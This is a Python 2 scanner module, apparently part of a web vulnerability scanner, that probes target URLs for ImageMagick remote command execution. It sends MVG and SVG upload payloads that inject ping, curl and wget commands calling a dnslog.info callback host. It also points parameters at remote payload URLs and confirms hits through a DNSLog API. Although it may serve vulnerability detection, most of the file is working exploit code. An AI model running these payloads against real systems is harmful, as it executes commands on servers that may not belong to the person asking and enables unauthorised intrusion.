#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import json
import time
import random
import base64
import urllib
import string
import urlparse
import requests
import simplejson

try:
    from modules.monkey import patch_session
    patch_session()
except Exception, e:
    pass

def run(url, data):
    try:
        jsonData = json.loads(base64.b64decode(data))
        #print(jsonData)
        url = "%s" % url
        headers = jsonData['headers']
        data = jsonData['payload']
        method = jsonData['method']
        furl = urlparse.urlparse(url)
        results = []
        vul_results = []

        if (headers.get('Content-Type', "")).find('multipart/form-data')!=-1:
            headers['Content-Type'] = 'multipart/form-data; boundary=----WebKitFormBoundaryUmIQaki9fwqOcYJp'
            formarg = (headers['Content-Type']).replace('multipart/form-data; boundary=', '')
            request = """--%s\r\nContent-Disposition: form-data; name="%s"; %s\r\n--%s--"""
            if (headers['Content-Type']).find('multipart/form-data')!=-1:
                if method == "POST":
                    #测试post传递的post参数
                    argvs = urlparse.parse_qsl(data, 1)
                    for arg in argvs:
                        querys = checkExec(url)
                        for query in querys:
                            verf = query[1]
                            try:
                                payload = request % (formarg, arg[0], query[0], formarg)
                                results.append(({
                                                'url': url,
                                                'description': u'目标存在ImageMagick漏洞可远程执行命令，请求如上',
                                                'probe': {
                                                            'method': method,
                                                            'url': url,
                                                            'headers': headers,
                                                            'payload': payload,
                                                }
                                }, verf))
                                response = requests.post(url, headers=headers, data=payload, timeout=15, verify=False)
                            except Exception, e:
                                continue
            time.sleep(3)#防止只有一个参数时的漏报
            domain = '%s'%(urlparse.urlparse(url).netloc)
            for k in range(0, len(results)):
                judge = (results[k])[1]
                vfyres = requests.get('http://wydns.sinaapp.com/api/6fd078bf2834b1caf4f3fb87f7860d35/%s/DNSLog/'%judge, timeout=15, verify=False, allow_redirects=False)
                if len(vfyres.content) >= 10:
                    vul_results.append(results[k][0])
            print(simplejson.dumps(vul_results, indent=4))
        else:
            if method == "POST":
                #测试post传递的get参数
                argvs = urlparse.parse_qsl((urlparse.urlparse(url).query), 1)
                for arg in argvs:
                    querys = checkMagick(url, arg, argvs)
                    for x in range(0, len(querys)):
                        try:
                            checkdata = querys[x][0]
                            verf = querys[x][1]#判定随机数
                            newurl = "%s?%s" %(urlparse.urlunsplit((furl.scheme, furl.netloc, furl.path, '', '')), checkdata)
                            response = requests.post(newurl, headers=headers, data=data, timeout=15, verify=False, allow_redirects=False)
                            results.append(({
                                            'url': url,
                                            'description': u'目标存在ImageMagick漏洞可远程执行命令，请求如上',
                                            'probe': {
                                                        'method': method,
                                                        'url': newurl,
                                                        'headers': headers,
                                                        'payload': data,
                                            }
                            }, verf))
                        except Exception, e:
                            continue
                #测试post传递的post参数
                argvs = urlparse.parse_qsl(data, 1)
                for arg in argvs:
                    querys = checkMagick(url, arg, argvs)
                    for x in range(0, len(querys)):
                        try:
                            checkdata = querys[x][0]
                            verf = querys[x][1]#判定随机数
                            response = requests.post(url, headers=headers, data=checkdata, timeout=15, verify=False, allow_redirects=False)
                            results.append(({
                                            'url': url,
                                            'description': u'目标存在ImageMagick漏洞可远程执行命令，请求如上',
                                            'probe': {
                                                        'method': method,
                                                        'url': url,
                                                        'headers': headers,
                                                        'payload': checkdata,
                                            }
                            }, verf))
                        except Exception, e:
                            continue
            elif method == "GET":
                if not(data=='' or data==None):
                    url = "%s&%s"%(url, data)
                argvs = urlparse.parse_qsl((urlparse.urlparse(url).query), 1)
                for arg in argvs:
                    querys = checkMagick(url, arg, argvs)
                    for x in range(0, len(querys)):
                        try:
                            checkdata = querys[x][0]
                            verf = "%s"%querys[x][1]#判定随机数
                            newurl = "%s?%s" %(urlparse.urlunsplit((furl.scheme, furl.netloc, furl.path, '', '')), checkdata)
                            response = requests.get(newurl, headers=headers, timeout=15, verify=False, allow_redirects=False)
                            results.append(({
                                            'url': url,
                                            'description': u'目标存在ImageMagick漏洞可远程执行命令，请求如上',
                                            'probe': {
                                                        'method': method,
                                                        'url': newurl,
                                                        'headers': headers,
                                                        'payload': '',
                                            }
                            }, verf))
                        except Exception, e:
                            continue
            time.sleep(3)#防止只有一个参数时漏报的问题
            for k in range(0, len(results)):
                judge = (results[k])[1]
                vfyres = requests.get('http://wydns.sinaapp.com/api/6fd078bf2834b1caf4f3fb87f7860d35/%s/DNSLog/'%judge, timeout=15, verify=False, allow_redirects=False)
                if len(vfyres.content) >= 10:
                    vul_results.append(results[k][0])
            print(simplejson.dumps(vul_results, indent=4))
    except Exception, e:
        print(simplejson.dumps([]))

def checkExec(url):
    randnum1 = str(random.randint(111111, 999999))
    randnum2 = str(random.randint(111111, 999999))
    result = []
    result.append(["""filename="image.jpg"\r\nContent-+Type: image/jpeg\r\n\r\npush graphic-context \r\nviewbox 0 0 640 480\r\nfill 'url(https://jpeg.com/image.jpg"|ping %s.11e64e.dnslog.info -c 1||curl http://%s.11e64e.dnslog.info/||wget http://%s.11e64e.dnslog.info -c 1/||start http://%s.11e64e.dnslog.info/")'\r\npop graphic-context""" % (randnum1, randnum1, randnum1, randnum1), randnum1])
    result.append(["""filename="image.jpg"\r\nContent-+Type: image/jpg\r\n\r\n<?xml version="1.0" standalone="no"?>\r\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\r\n<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\r\n<image xlink:href="https://example.com/image.jpg&quot;|ping %s.11e64e.dnslog.info -c 1||curl http://%s.11e64e.dnslog.info/||wget http://%s.11e64e.dnslog.info -c 1/||start http://%s.11e64e.dnslog.info/&quot;" x="0" y="0" height="640px" width="480px"/>\r\n</svg>""" % (randnum2, randnum2, randnum2, randnum2), randnum2])
    return result

def checkMagick(url, arg, argvs):
    reject_key = ['__VIEWSTATE', 'IbtnEnter.x', 'IbtnEnter.y']
    payloads = [
                'http://py4.me/mvg',
                'http://py4.me/svg',
    ]
    result = []
    furl = urlparse.urlparse(url)
    for payload in payloads:
        query = []
        randnum = str(random.randint(11111111, 99999999))
        for x in range(0, len(argvs)):
            if arg[0] == argvs[x][0] and not(arg[0] in reject_key):
                query.append((arg[0], "%s%s.jpg" %(payload, randnum)))
            else:
                query.append((argvs[x][0], argvs[x][1]))
        result.append([urllib.urlencode(query), randnum])
    return result


if __name__ == "__main__":
    if len(sys.argv) == 3:
        url = sys.argv[1]
        data = sys.argv[2]
        run(url, data)#run module
        sys.exit(0)
    else:
        print(simplejson.dumps([]))
        sys.exit(0)
